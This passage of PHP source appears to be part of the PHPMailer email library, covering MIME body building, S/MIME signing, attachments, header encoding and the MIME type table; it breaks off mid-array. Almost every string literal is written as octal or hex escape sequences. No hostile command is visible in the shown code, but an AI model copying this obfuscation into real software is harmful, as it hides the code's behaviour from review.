$this->textLine("\11\x62\157\165\x6e\x64\x61\x72\x79\x3d\x22" . $this->boundary[2] . "\x22"); $body .= $this->LE; $body .= $this->getBoundary($this->boundary[2], $altBodyCharSet, "\x74\x65\x78\x74\x2f\x70\x6c\x61\x69\x6e", $altBodyEncoding); $body .= $this->encodeString($this->AltBody, $altBodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->textLine("\55\55" . $this->boundary[2]); $body .= $this->headerLine("\x43\x6f\x6e\164\145\156\164\55\124\171\160\145", "\x6d\165\x6c\164\151\160\x61\x72\164\x2f\162\x65\x6c\141\x74\x65\144\73"); $body .= $this->textLine("\x9\142\157\x75\x6e\x64\x61\162\x79\x3d\42" . $this->boundary[3] . "\42"); $body .= $this->LE; $body .= $this->getBoundary($this->boundary[3], $bodyCharSet, "\x74\145\x78\x74\x2f\150\164\155\x6c", $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->attachAll("\x69\156\154\x69\x6e\x65", $this->boundary[3]); $body .= $this->LE; $body .= $this->endBoundary($this->boundary[2]); $body .= $this->LE; $body .= $this->attachAll("\x61\164\164\141\x63\150\x6d\x65\x6e\x74", $this->boundary[1]); break; default: $this->Encoding = $bodyEncoding; $body .= $this->encodeString($this->Body, $this->Encoding); break; } if ($this->isError()) { $body = ''; } elseif ($this->sign_key_file) { try { if (!defined("\120\x4b\x43\x53\67\x5f\x54\105\130\124")) { throw new phpmailerException($this->lang("\x65\170\164\x65\x6e\x73\x69\x6f\156\137\155\151\163\x73\151\156\x67") . "\157\x70\x65\156\x73\x73\154"); } $file = tempnam(sys_get_temp_dir(), "\x6d\x61\151\154"); if (false === file_put_contents($file, $body)) { throw new phpmailerException($this->lang("\163\151\x67\x6e\151\x6e\147") . "\x20\103\157\165\x6c\x64\x20\x6e\x6f\x74\x20\167\162\151\164\x65\40\x74\145\x6d\x70\x20\x66\x69\x6c\x65"); } $signed = tempnam(sys_get_temp_dir(), "\x73\x69\147\x6e\x65\x64"); if (empty($this->sign_extracerts_file)) { $sign = @openssl_pkcs7_sign($file, $signed, "\x66\x69\154\x65\x3a\x2f\x2f" . realpath($this->sign_cert_file), array("\146\x69\x6c\145\x3a\x2f\57" . realpath($this->sign_key_file), $this->sign_key_pass), null); } else { $sign = @openssl_pkcs7_sign($file, $signed, "\146\x69\154\145\72\x2f\57" . realpath($this->sign_cert_file), array("\x66\x69\x6c\145\x3a\x2f\x2f" . realpath($this->sign_key_file), $this->sign_key_pass), null, PKCS7_DETACHED, $this->sign_extracerts_file); } if ($sign) { @unlink($file); $body = file_get_contents($signed); @unlink($signed); $parts = explode("\12\12", $body, 2); $this->MIMEHeader .= $parts[0] . $this->LE . $this->LE; $body = $parts[1]; } else { @unlink($file); @unlink($signed); throw new phpmailerException($this->lang("\x73\x69\x67\x6e\x69\x6e\147") . openssl_error_string()); } } catch (phpmailerException $exc) { $body = ''; if ($this->exceptions) { throw $exc; } } } return $body; } protected function getBoundary($boundary, $charSet, $contentType, $encoding) { $result = ''; if ($charSet == '') { $charSet = $this->CharSet; } if ($contentType == '') { $contentType = $this->ContentType; } if ($encoding == '') { $encoding = $this->Encoding; } $result .= $this->textLine("\55\55" . $boundary); $result .= sprintf("\x43\x6f\x6e\x74\145\x6e\x74\x2d\124\x79\x70\x65\x3a\40\45\x73\73\40\143\x68\141\x72\x73\x65\164\75\x25\x73", $contentType, $charSet); $result .= $this->LE; if ($encoding != "\67\142\x69\164") { $result .= $this->headerLine("\103\x6f\156\x74\x65\x6e\164\55\124\162\x61\156\x73\x66\x65\x72\x2d\105\156\x63\x6f\144\151\x6e\x67", $encoding); } $result .= $this->LE; return $result; } protected function endBoundary($boundary) { return $this->LE . "\55\55" . $boundary . "\x2d\x2d" . $this->LE; } protected function setMessageType() { $type = array(); if ($this->alternativeExists()) { $type[] = "\x61\154\164"; } if ($this->inlineImageExists()) { $type[] = "\x69\x6e\154\x69\156\145"; } if ($this->attachmentExists()) { $type[] = "\141\x74\x74\141\x63\x68"; } $this->message_type = implode("\137", $type); if ($this->message_type == '') { $this->message_type = "\160\x6c\x61\151\x6e"; } } public function headerLine($name, $value) { return $name . "\72\40" . $value . $this->LE; } public function textLine($value) { return $value . $this->LE; } public function addAttachment($path, $name = '', $encoding = "\x62\141\x73\145\x36\x34", $type = '', $disposition = "\x61\x74\x74\141\143\x68\155\145\x6e\164") { try { if (!self::isPermittedPath($path) or !@is_file($path)) { throw new phpmailerException($this->lang("\x66\x69\x6c\145\x5f\141\x63\143\145\163\163") . $path, self::STOP_CONTINUE); } if ($type == '') { $type = self::filenameToType($path); } $filename = basename($path); if ($name == '') { $name = $filename; } $this->attachment[] = array(0 => $path, 1 => $filename, 2 => $name, 3 => $encoding, 4 => $type, 5 => false, 6 => $disposition, 7 => 0); } catch (phpmailerException $exc) { $this->setError($exc->getMessage()); $this->edebug($exc->getMessage()); if ($this->exceptions) { throw $exc; } return false; } return true; } public function getAttachments() { return $this->attachment; } protected function attachAll($disposition_type, $boundary) { $mime = array(); $cidUniq = array(); $incl = array(); foreach ($this->attachment as $attachment) { if ($attachment[6] == $disposition_type) { $string = ''; $path = ''; $bString = $attachment[5]; if ($bString) { $string = $attachment[0]; } else { $path = $attachment[0]; } $inclhash = md5(serialize($attachment)); if (in_array($inclhash, $incl)) { continue; } $incl[] = $inclhash; $name = $attachment[2]; $encoding = $attachment[3]; $type = $attachment[4]; $disposition = $attachment[6]; $cid = $attachment[7]; if ($disposition == "\151\x6e\154\151\x6e\145" && array_key_exists($cid, $cidUniq)) { continue; } $cidUniq[$cid] = true; $mime[] = sprintf("\55\55\45\163\x25\163", $boundary, $this->LE); if (!empty($name)) { $mime[] = sprintf("\x43\157\156\164\145\156\x74\x2d\124\171\x70\x65\x3a\40\x25\x73\x3b\x20\x6e\x61\x6d\145\x3d\42\45\163\42\x25\163", $type, $this->encodeHeader($this->secureHeader($name)), $this->LE); } else { $mime[] = sprintf("\103\157\156\164\x65\x6e\164\55\124\x79\160\145\x3a\40\45\x73\x25\163", $type, $this->LE); } if ($encoding != "\x37\142\x69\164") { $mime[] = sprintf("\103\157\156\164\x65\x6e\x74\x2d\x54\162\x61\156\163\x66\x65\x72\55\105\x6e\x63\x6f\144\x69\156\x67\x3a\x20\45\163\45\x73", $encoding, $this->LE); } if ($disposition == "\151\x6e\154\x69\x6e\145") { $mime[] = sprintf("\103\x6f\156\164\x65\x6e\x74\x2d\x49\104\72\40\x3c\x25\163\76\45\163", $cid, $this->LE); } if (!empty($disposition)) { $encoded_name = $this->encodeHeader($this->secureHeader($name)); if (preg_match("\57\x5b\40\x5c\50\x5c\51\74\x3e\100\54\73\x3a\134\42\134\x2f\x5c\133\x5c\135\x5c\x3f\75\x5d\57", $encoded_name)) { $mime[] = sprintf("\103\x6f\156\164\145\x6e\x74\x2d\104\151\x73\x70\157\163\x69\x74\x69\x6f\156\x3a\x20\x25\x73\x3b\40\x66\x69\x6c\145\x6e\x61\x6d\145\x3d\42\x25\x73\x22\x25\x73", $disposition, $encoded_name, $this->LE . $this->LE); } else { if (!empty($encoded_name)) { $mime[] = sprintf("\x43\157\x6e\164\x65\156\x74\55\x44\151\x73\160\x6f\163\x69\x74\x69\x6f\x6e\72\x20\x25\163\73\x20\x66\x69\x6c\145\156\141\155\x65\75\x25\x73\45\163", $disposition, $encoded_name, $this->LE . $this->LE); } else { $mime[] = sprintf("\103\157\156\x74\145\x6e\164\55\104\151\163\x70\157\x73\151\164\151\x6f\x6e\72\40\45\x73\x25\163", $disposition, $this->LE . $this->LE); } } } else { $mime[] = $this->LE; } if ($bString) { $mime[] = $this->encodeString($string, $encoding); if ($this->isError()) { return ''; } $mime[] = $this->LE . $this->LE; } else { $mime[] = $this->encodeFile($path, $encoding); if ($this->isError()) { return ''; } $mime[] = $this->LE . $this->LE; } } } $mime[] = sprintf("\55\55\x25\163\55\x2d\45\x73", $boundary, $this->LE); return implode('', $mime); } protected function encodeFile($path, $encoding = "\142\x61\x73\145\x36\x34") { try { if (!self::isPermittedPath($path) or !file_exists($path)) { throw new phpmailerException($this->lang("\146\151\154\145\137\x6f\160\145\x6e") . $path, self::STOP_CONTINUE); } $magic_quotes = false; if (version_compare(PHP_VERSION, "\67\56\64\56\x30", "\74")) { $magic_quotes = get_magic_quotes_runtime(); } if ($magic_quotes) { if (version_compare(PHP_VERSION, "\65\x2e\63\x2e\60", "\x3c")) { set_magic_quotes_runtime(false); } else { ini_set("\x6d\141\x67\x69\143\x5f\161\165\x6f\164\x65\x73\137\x72\165\156\164\151\155\145", false); } } $file_buffer = file_get_contents($path); $file_buffer = $this->encodeString($file_buffer, $encoding); if ($magic_quotes) { if (version_compare(PHP_VERSION, "\x35\56\x33\56\x30", "\74")) { set_magic_quotes_runtime($magic_quotes); } else { ini_set("\x6d\x61\x67\x69\x63\137\x71\x75\x6f\x74\145\x73\x5f\x72\165\x6e\164\x69\x6d\x65", $magic_quotes); } } return $file_buffer; } catch (Exception $exc) { $this->setError($exc->getMessage()); return ''; } } public function encodeString($str, $encoding = "\x62\141\163\x65\66\64") { $encoded = ''; switch (strtolower($encoding)) { case "\142\x61\x73\x65\x36\x34": $encoded = chunk_split(base64_encode($str), 76, $this->LE); break; case "\67\x62\x69\164": case "\70\142\x69\x74": $encoded = $this->fixEOL($str); if (substr($encoded, -strlen($this->LE)) != $this->LE) { $encoded .= $this->LE; } break; case "\142\x69\156\x61\x72\171": $encoded = $str; break; case "\161\x75\157\x74\x65\144\x2d\x70\162\151\x6e\164\141\142\154\x65": $encoded = $this->encodeQP($str); break; default: $this->setError($this->lang("\145\156\143\x6f\x64\151\156\147") . $encoding); break; } return $encoded; } public function encodeHeader($str, $position = "\x74\145\170\x74") { $matchcount = 0; switch (strtolower($position)) { case "\x70\x68\x72\x61\x73\x65": if (!preg_match("\x2f\133\x5c\x32\60\60\55\134\x33\x37\67\x5d\57", $str)) { $encoded = addcslashes($str, "\x0\56\56\x1f\177\x5c\x22"); if ($str == $encoded && !preg_match("\57\133\136\x41\55\132\x61\55\172\60\55\x39\41\43\44\45\x26\47\52\53\134\57\x3d\x3f\136\137\140\173\174\175\176\x20\55\x5d\57", $str)) { return $encoded; } else { return "\x22{$encoded}\42"; } } $matchcount = preg_match_all("\x2f\x5b\136\x5c\60\x34\x30\134\60\x34\x31\x5c\x30\x34\x33\x2d\x5c\x31\63\63\134\x31\63\65\55\x5c\61\67\x36\135\x2f", $str, $matches); break; case "\x63\x6f\x6d\155\145\156\164": $matchcount = preg_match_all("\57\x5b\x28\x29\42\135\x2f", $str, $matches); case "\164\145\x78\164": default: $matchcount += preg_match_all("\x2f\133\134\x30\60\60\x2d\134\x30\61\x30\x5c\x30\x31\x33\134\60\x31\x34\134\x30\61\66\x2d\x5c\60\x33\67\x5c\x31\x37\x37\x2d\x5c\x33\x37\x37\135\57", $str, $matches); break; } if ($matchcount == 0) { return $str; } $maxlen = 75 - 7 - strlen($this->CharSet); if ($matchcount > strlen($str) / 3) { $encoding = "\x42"; if (function_exists("\155\142\x5f\x73\x74\x72\154\x65\x6e") && $this->hasMultiBytes($str)) { $encoded = $this->base64EncodeWrapMB($str, "\12"); } else { $encoded = base64_encode($str); $maxlen -= $maxlen % 4; $encoded = trim(chunk_split($encoded, $maxlen, "\12")); } } else { $encoding = "\x51"; $encoded = $this->encodeQ($str, $position); $encoded = $this->wrapText($encoded, $maxlen, true); $encoded = str_replace("\x3d" . self::CRLF, "\12", trim($encoded)); } $encoded = preg_replace("\57\136\x28\x2e\x2a\x29\44\x2f\x6d", "\40\75\x3f" . $this->CharSet . "\77{$encoding}\77\134\61\x3f\x3d", $encoded); $encoded = trim(str_replace("\12", $this->LE, $encoded)); return $encoded; } public function hasMultiBytes($str) { if (function_exists("\x6d\x62\137\x73\x74\x72\x6c\145\156")) { return strlen($str) > mb_strlen($str, $this->CharSet); } else { return false; } } public function has8bitChars($text) { return (bool) preg_match("\x2f\x5b\134\170\x38\60\55\x5c\170\x46\106\x5d\57", $text); } public function base64EncodeWrapMB($str, $linebreak = null) { $start = "\x3d\77" . $this->CharSet . "\x3f\102\x3f"; $end = "\x3f\75"; $encoded = ''; if ($linebreak === null) { $linebreak = $this->LE; } $mb_length = mb_strlen($str, $this->CharSet); $length = 75 - strlen($start) - strlen($end); $ratio = $mb_length / strlen($str); $avgLength = floor($length * $ratio * 0.75); for ($i = 0; $i < $mb_length; $i += $offset) { $lookBack = 0; do { $offset = $avgLength - $lookBack; $chunk = mb_substr($str, $i, $offset, $this->CharSet); $chunk = base64_encode($chunk); $lookBack++; } while (strlen($chunk) > $length); $encoded .= $chunk . $linebreak; } $encoded = substr($encoded, 0, -strlen($linebreak)); return $encoded; } public function encodeQP($string, $line_max = 76) { if (function_exists("\161\165\x6f\164\145\144\x5f\160\162\x69\x6e\x74\x61\142\154\x65\x5f\145\x6e\143\157\x64\145")) { return quoted_printable_encode($string); } $string = str_replace(array("\45\x32\x30", "\45\x30\x44\45\60\x41\x2e", "\x25\x30\x44\x25\x30\101", "\x25"), array("\x20", "\15\12\75\x32\x45", "\15\12", "\75"), rawurlencode($string)); return preg_replace("\x2f\x5b\136\x5c\162\134\156\x5d\x7b" . ($line_max - 3) . "\175\x5b\136\x3d\134\x72\134\156\x5d\173\62\x7d\57", "\x24\x30\x3d\xd\12", $string); } public function encodeQPphp($string, $line_max = 76, $space_conv = false) { return $this->encodeQP($string, $line_max); } public function encodeQ($str, $position = "\164\145\170\x74") { $pattern = ''; $encoded = str_replace(array("\15", "\xa"), '', $str); switch (strtolower($position)) { case "\x70\x68\x72\141\x73\145": $pattern = "\x5e\x41\x2d\132\141\55\172\x30\x2d\71\41\x2a\53\134\57\40\55"; break; case "\143\x6f\x6d\155\x65\x6e\164": $pattern = "\x5c\x28\134\x29\x22"; case "\164\x65\170\164": default: $pattern = "\134\60\x30\60\55\x5c\60\61\61\x5c\x30\61\x33\134\x30\x31\x34\134\x30\61\x36\x2d\x5c\x30\63\x37\134\60\67\65\x5c\60\x37\67\134\61\x33\67\x5c\61\67\x37\x2d\134\63\x37\67" . $pattern; break; } $matches = array(); if (preg_match_all("\x2f\x5b{$pattern}\135\x2f", $encoded, $matches)) { $eqkey = array_search("\75", $matches[0]); if (false !== $eqkey) { unset($matches[0][$eqkey]); array_unshift($matches[0], "\75"); } foreach (array_unique($matches[0]) as $char) { $encoded = str_replace($char, "\x3d" . sprintf("\x25\60\x32\130", ord($char)), $encoded); } } return str_replace("\x20", "\137", $encoded); } public function addStringAttachment($string, $filename, $encoding = "\x62\x61\x73\145\66\64", $type = '', $disposition = "\x61\x74\x74\x61\143\x68\155\145\x6e\x74") { if ($type == '') { $type = self::filenameToType($filename); } $this->attachment[] = array(0 => $string, 1 => $filename, 2 => basename($filename), 3 => $encoding, 4 => $type, 5 => true, 6 => $disposition, 7 => 0); } public function addEmbeddedImage($path, $cid, $name = '', $encoding = "\x62\x61\163\145\66\x34", $type = '', $disposition = "\151\156\154\x69\156\145") { if (!self::isPermittedPath($path) or !@is_file($path)) { $this->setError($this->lang("\x66\151\154\145\137\141\x63\143\x65\x73\163") . $path); return false; } if ($type == '') { $type = self::filenameToType($path); } $filename = basename($path); if ($name == '') { $name = $filename; } $this->attachment[] = array(0 => $path, 1 => $filename, 2 => $name, 3 => $encoding, 4 => $type, 5 => false, 6 => $disposition, 7 => $cid); return true; } public function addStringEmbeddedImage($string, $cid, $name = '', $encoding = "\142\x61\163\x65\66\64", $type = '', $disposition = "\x69\x6e\x6c\151\156\145") { if ($type == '' and !empty($name)) { $type = self::filenameToType($name); } $this->attachment[] = array(0 => $string, 1 => $name, 2 => $name, 3 => $encoding, 4 => $type, 5 => true, 6 => $disposition, 7 => $cid); return true; } public function inlineImageExists() { foreach ($this->attachment as $attachment) { if ($attachment[6] == "\x69\x6e\x6c\x69\x6e\x65") { return true; } } return false; } public function attachmentExists() { foreach ($this->attachment as $attachment) { if ($attachment[6] == "\x61\x74\x74\x61\x63\x68\155\145\156\x74") { return true; } } return false; } public function alternativeExists() { return !empty($this->AltBody); } public function clearQueuedAddresses($kind) { $RecipientsQueue = $this->RecipientsQueue; foreach ($RecipientsQueue as $address => $params) { if ($params[0] == $kind) { unset($this->RecipientsQueue[$address]); } } } public function clearAddresses() { foreach ($this->to as $to) { unset($this->all_recipients[strtolower($to[0])]); } $this->to = array(); $this->clearQueuedAddresses("\x74\x6f"); } public function clearCCs() { foreach ($this->cc as $cc) { unset($this->all_recipients[strtolower($cc[0])]); } $this->cc = array(); $this->clearQueuedAddresses("\143\x63"); } public function clearBCCs() { foreach ($this->bcc as $bcc) { unset($this->all_recipients[strtolower($bcc[0])]); } $this->bcc = array(); $this->clearQueuedAddresses("\x62\143\143"); } public function clearReplyTos() { $this->ReplyTo = array(); $this->ReplyToQueue = array(); } public function clearAllRecipients() { $this->to = array(); $this->cc = array(); $this->bcc = array(); $this->all_recipients = array(); $this->RecipientsQueue = array(); } public function clearAttachments() { $this->attachment = array(); } public function clearCustomHeaders() { $this->CustomHeader = array(); } protected function setError($msg) { $this->error_count++; if ($this->Mailer == "\x73\155\x74\x70" and !is_null($this->smtp)) { $lasterror = $this->smtp->getError(); if (!empty($lasterror["\145\x72\162\x6f\162"])) { $msg .= $this->lang("\163\x6d\164\x70\x5f\x65\x72\162\157\162") . $lasterror["\145\162\162\x6f\162"]; if (!empty($lasterror["\x64\145\164\141\151\154"])) { $msg .= "\40\104\x65\x74\x61\x69\154\72\40" . $lasterror["\x64\145\164\x61\x69\154"]; } if (!empty($lasterror["\163\x6d\164\160\x5f\x63\157\x64\x65"])) { $msg .= "\x20\x53\115\x54\120\x20\x63\x6f\144\145\72\x20" . $lasterror["\x73\155\164\160\137\143\157\144\145"]; } if (!empty($lasterror["\x73\155\164\160\x5f\143\x6f\x64\145\137\145\170"])) { $msg .= "\40\101\144\144\151\x74\151\x6f\x6e\x61\x6c\x20\123\115\124\120\40\151\x6e\x66\157\x3a\x20" . $lasterror["\163\155\164\160\137\x63\x6f\x64\145\137\x65\170"]; } } } $this->ErrorInfo = $msg; } public static function rfcDate() { date_default_timezone_set(@date_default_timezone_get()); return date("\104\54\40\152\40\x4d\40\131\x20\110\x3a\x69\72\x73\x20\x4f"); } protected function serverHostname() { $result = "\x6c\x6f\143\x61\x6c\150\x6f\x73\164\x2e\x6c\x6f\143\141\x6c\x64\157\155\x61\151\x6e"; if (!empty($this->Hostname)) { $result = $this->Hostname; } elseif (isset($_SERVER) and array_key_exists("\x53\105\122\126\x45\x52\137\x4e\x41\115\x45", $_SERVER) and !empty($_SERVER["\123\x45\122\x56\105\122\x5f\116\101\x4d\105"])) { $result = $_SERVER["\123\x45\122\x56\105\x52\x5f\116\x41\115\105"]; } elseif (function_exists("\147\x65\164\x68\x6f\163\164\x6e\x61\x6d\x65") && gethostname() !== false) { $result = gethostname(); } elseif (php_uname("\x6e") !== false) { $result = php_uname("\156"); } return $result; } protected function lang($key) { if (count($this->language) < 1) { $this->setLanguage("\x65\156"); } if (array_key_exists($key, $this->language)) { if ($key == "\163\x6d\164\x70\137\143\157\156\x6e\x65\143\164\137\x66\141\x69\x6c\145\144") { return $this->language[$key] . "\40\x68\164\164\x70\163\72\57\x2f\x67\151\164\x68\x75\x62\56\143\157\155\57\x50\x48\120\x4d\x61\x69\x6c\145\162\x2f\x50\110\x50\115\141\x69\154\145\x72\57\x77\151\x6b\x69\x2f\124\162\x6f\165\x62\x6c\145\x73\x68\157\x6f\164\151\156\147"; } return $this->language[$key]; } else { return $key; } } public function isError() { return $this->error_count > 0; } public function fixEOL($str) { $nstr = str_replace(array("\15\12", "\xd"), "\xa", $str); if ($this->LE !== "\xa") { $nstr = str_replace("\12", $this->LE, $nstr); } return $nstr; } public function addCustomHeader($name, $value = null) { if ($value === null) { $this->CustomHeader[] = explode("\x3a", $name, 2); } else { $this->CustomHeader[] = array($name, $value); } } public function getCustomHeaders() { return $this->CustomHeader; } public function msgHTML($message, $basedir = '', $advanced = false) { preg_match_all("\57\x28\x73\x72\143\x7c\x62\x61\143\153\147\x72\x6f\x75\x6e\x64\51\75\133\42\x27\x5d\x28\x2e\x2a\51\x5b\42\x27\x5d\x2f\125\151", $message, $images); if (array_key_exists(2, $images)) { if (strlen($basedir) > 1 && substr($basedir, -1) != "\57") { $basedir .= "\57"; } foreach ($images[2] as $imgindex => $url) { if (preg_match("\x23\136\x64\141\x74\141\72\50\x69\x6d\x61\147\x65\x5b\x5e\73\54\135\52\x29\50\x3b\x62\141\163\145\x36\64\51\77\54\43", $url, $match)) { $data = substr($url, strpos($url, "\x2c")); if ($match[2]) { $data = base64_decode($data); } else { $data = rawurldecode($data); } $cid = md5($url) . "\x40\160\x68\x70\x6d\141\151\154\x65\162\x2e\60"; if ($this->addStringEmbeddedImage($data, $cid, "\145\x6d\x62\x65\144" . $imgindex, "\142\x61\x73\145\66\64", $match[1])) { $message = str_replace($images[0][$imgindex], $images[1][$imgindex] . "\x3d\x22\143\x69\144\72" . $cid . "\42", $message); } continue; } if (!empty($basedir) && strpos($url, "\x2e\x2e") === false && substr($url, 0, 4) !== "\143\x69\x64\x3a" && !preg_match("\x23\136\x5b\x61\x2d\172\x5d\x5b\x61\x2d\x7a\x30\x2d\x39\53\56\x2d\x5d\x2a\x3a\77\x2f\57\43\x69", $url)) { $filename = basename($url); $directory = dirname($url); if ($directory == "\x2e") { $directory = ''; } $cid = md5($url) . "\x40\x70\x68\x70\x6d\141\x69\154\145\x72\x2e\x30"; if (strlen($directory) > 1 && substr($directory, -1) != "\x2f") { $directory .= "\x2f"; } if ($this->addEmbeddedImage($basedir . $directory . $filename, $cid, $filename, "\142\x61\163\x65\x36\x34", self::_mime_types((string) self::mb_pathinfo($filename, PATHINFO_EXTENSION)))) { $message = preg_replace("\x2f" . $images[1][$imgindex] . "\75\133\42\47\135" . preg_quote($url, "\57") . "\133\42\x27\x5d\57\x55\x69", $images[1][$imgindex] . "\75\42\143\151\144\x3a" . $cid . "\42", $message); } } } } $this->isHTML(true); $this->Body = $this->normalizeBreaks($message); $this->AltBody = $this->normalizeBreaks($this->html2text($message, $advanced)); if (!$this->alternativeExists()) { $this->AltBody = "\124\157\40\x76\x69\145\167\40\164\x68\x69\163\40\145\x6d\141\x69\x6c\40\155\145\x73\163\141\x67\x65\54\x20\157\160\x65\156\x20\x69\x74\x20\x69\x6e\40\141\40\160\x72\x6f\147\162\141\155\40\x74\150\141\164\x20\x75\156\144\x65\x72\x73\164\141\x6e\144\x73\40\x48\124\x4d\x4c\x21" . self::CRLF . self::CRLF; } return $this->Body; } public function html2text($html, $advanced = false) { if (is_callable($advanced)) { return call_user_func($advanced, $html); } return html_entity_decode(trim(strip_tags(preg_replace("\57\74\50\x68\145\x61\x64\174\164\151\164\x6c\145\x7c\x73\x74\171\154\x65\174\163\x63\162\151\x70\164\x29\x5b\x5e\76\135\x2a\x3e\56\x2a\x3f\74\134\x2f\134\x31\x3e\x2f\x73\151", '', $html))), ENT_QUOTES, $this->CharSet); } public static function _mime_types($ext = '') { $mimes = array("\x78\x6c" => "\141\160\160\x6c\151\143\141\x74\x69\157\156\57\x65\x78\x63\x65\x6c", "\x6a\163" => "\141\x70\160\154\x69\143\141\x74\x69\x6f\x6e\x2f\152\x61\x76\141\x73\143\162\151\160\x74", "\x68\x71\170" => "\141\160\160\154\x69\143\141\164\x69\x6f\x6e\57\x6d\x61\x63\55\142\151\156\x68\145\x78\x34\x30", "\x63\160\164" => "\x61\x70\x70\x6c\x69\x63\141\164\151\x6f\156\57\x6d\141\x63\55\x63\x6f\155\x70\141\143\x74\x70\162\x6f", "\x62\x69\156" => "\141\160\160\x6c\151\x63\x61\164\151\x6f\156\57\x6d\x61\143\142\151\156\x61\x72\171", "\144\x6f\x63" => "\x61\160\160\154\151\x63\x61\164\151\x6f\156\57\x6d\163\167\157\162\x64", "\x77\157\x72\x64" => "\141\160\x70\x6c\x69\143\141\164\x69\157\156\57\x6d\163\x77\157\162\144", "\170\x6c\163\x78" => "\x61\160\x70\x6c\x69\143\x61\164\x69\x6f\156\x2f\x76\x6e\x64\x2e\x6f\x70\x65\x6e\x78\x6d\154\x66\x6f\162\x6d\141\164\163\55\157\146\146\x69\143\145\144\x6f\x63\165\155\145\156\164\56\163\x70\x72\x65\141\144\163\150\x65\x65\x74\x6d\154\x2e\x73\x68\145\145\x74", "\170\154\x74\x78" => "\x61\160\160\154\x69\143\141\164\x69\x6f\156\x2f\166\156\x64\x2e\x6f\160\145\156\x78\x6d\154\x66\x6f\x72\x6d\141\164\x73\x2d\157\146\146\151\x63\x65\x64\x6f\x63\x75\155\x65\156\164\56\163\x70\162\x65\x61\144\x73\x68\145\x65\x74\x6d\154\56\164\145\x6d\160\154\141\164\x65", "\x70\157\164\170" => "\141\x70\x70\154\x69\143\x61\164\x69\157\156\x2f\166\x6e\x64\x2e\157\x70\145\156\x78\x6d\x6c\x66\x6f\162\x6d\141\164\x73\x2d\x6f\146\146\151\143\145\144\x6f\x63\165\x6d\145\x6e\x74\56\x70\x72\145\x73\x65\156\x74\x61\x74\x69\157\x6e\155\x6c\56\x74\145\155\x70\x6c\x61\164\145", "\160\x70\163\170" => "\141\160\x70\x6c\151\x63\141\164\x69\x6f\x6e\57\166\x6e\144\x2e\x6f\160\145\x6e\170\155\x6c\146\x6f\162\155\141\164\x73\55\x6f\146\x66\151\143\x65\x64\x6f\143\x75\x6d\145\156\x74\x2e\160\162\x65\x73\x65\x6e\x74\141\164\x69\x6f\156\155\x6c\56\163\154\151\144\x65\163\x68\157\x77", "\160\x70\164\x78" => "\141\x70\x70\154\151\143\141\x74\151\157\x6e\57\166\x6e\x64\x2e\157\x70\x65\x6e\170\155\154\146\x6f\x72\155\141\x74\163\55\x6f\x66\146\151\143\145\144\157\143\x75\x6d\x65\x6e\x74\x2e\x70\x72\145\x73\145\156\x74\x61\x74\x69\157\x6e\155\154\56\160\x72\145\x73\145\156\164\x61\x74\x69\x6f\x6e", "\163\154\x64\170" => "\x61\x70\x70\154\151\143\x61\164\151\x6f\156\57\166\156\144\56\157\x70\145\156\170\155\154\146\157\162\x6d\141\164\x73\x2d\157\x66\x66\151\x63\145\144\x6f\143\x75\x6d\145\x6e\164\56\x70\x72\145\x73\145\x6e\x74\x61\164\151\157\156\x6d\154\56\x73\x6c\151\x64\145", "\x64\x6f\x63\x78" => "\141\160\x70\x6c\x69\143\x61\x74\151\157\x6e\57\166\156\x64\x2e\x6f\x70\145\x6e\170\x6d\x6c\x66\157\162\x6d\141\x74\163\55\157\x66\146\x69\143\145\144\157\x63\165\155\145\x6e\x74\x2e\x77\x6f\x72\144\x70\x72\157\x63\145\x73\x73\151\x6e\147\155\x6c\x2e\144\157\143\x75\155\x65\156\x74", "\144\x6f\164\x78" => "\141\x70\160\154\x69\x63\x61\x74\151\157\x6e\x2f\x76\x6e\x64\x2e\x6f\x70\145\156\x78\x6d\x6c\146\x6f\x72\x6d\x61\x74\x73\55\x6f\146\x66\x69\143\145\x64\157\x63\x75\x6d\x65\x6e\164\56\167\157\162\x64\x70\x72\157\143\145\163\163\151\156\147\x6d\154\56\164\x65\x6d\x70\x6c\x61\164\145", "\170\x6c\x61\x6d" => "\141\x70\x70\x6c\x69\x63\141\164\x69\157\x6e\57\166\156\x64\x2e\155\163\x2d\x65\x78\143\145\x6c\56\141\144\x64\151\156\56\x6d\141\143\x72\x6f\105\x6e\x61\x62\154\x65\144\x2e\x31\62", "\x78\154\163\142" => "\x61\x70\160\x6c\x69\x63\141\164\x69\x6f\x6e\57\166\x6e\x64\56\155\x73\55\x65\x78\143\145\x6c\x2e\x73\150\145\145\164\x2e\x62\151\156\141\x72\171\x2e\155\141\x63\x72\157\x45\156\x61\142\154\x65\144\x2e\61\x32", "\143\x6c\141\x73\x73" => "\141\x70\160\x6c\151\143\x61\x74\151\x6f\x6e\x2f\157\x63\164\145\x74\55\x73\164\x72\145\141\x6d", "\x64\x6c\154" => "\141\x70\160\x6c\151\x63\141\x74\x69\157\156\57\x6f\x63\x74\145\164\x2d\x73\x74\162\145\x61\x6d", "\144\x6d\x73" => "\x61\x70\160\154\x69\x63\x61\x74\151\157\x6e\x2f\157\143\x74\145\164\55\163\x74\x72\145\141\155", "\x65\170\x65" => "\x61\160\160\x6c\151\x63\x61\x74\x69\157\x6e\57\x6f\143\x74\145\x74\55\x73\164\162\x65\141\155", "\x6c\150\x61" => "\141\x70\160\154\x69\x63\x61\x74\x69\157\x6e\57\157\143\164\145\x74\x2d\163\x74\x72\x65\141\x6d", "\154\172\150" => "\x61\160\x70\x6c\151\x63\141\164\151\x6f\156\x2f\x6f\x63\164\x65\164\x2d\163\x74\162\x65\141\x6d", "\x70\x73\144" => "\x61\160\160\154\151\143\141\x74\151\x6f\156\57\157\143\164\145\164\55\163\164\162\x65\x61\x6d", "\x73\x65\141" => "\x61\x70\x70\154\151\x63\x61\x74\151\157\156\x2f\x6f\143\164\145\164\x2d\163\164\162\145\x61\x6d", "\163\157" => "\x61\x70\160\154\x69\x63\141\164\151\x6f\156\x2f\157\x63\x74\145\x74\x2d\163\164\x72\x65\141\155", "\157\144\x61" => "\x61\x70\160\x6c\151\x63\141\x74\151\157\156\x2f\x6f\144\x61", "\160\144\146" => "\141\x70\x70\154\151\x63\141\x74\x69\x6f\156\57\160\x64\x66", "\x61\151" => "\141\x70\160\x6c\151\143\x61\164\x69\x6f\156\57\x70\157\x73\164\163\143\162\151\x70\x74", "\145\x70\163" => "\x61\x70\x70\x6c\x69\143\141\164\x69\157\156\x2f\x70\157\163\x74\163\143\x72\x69\x70\164", "\x70\x73" => 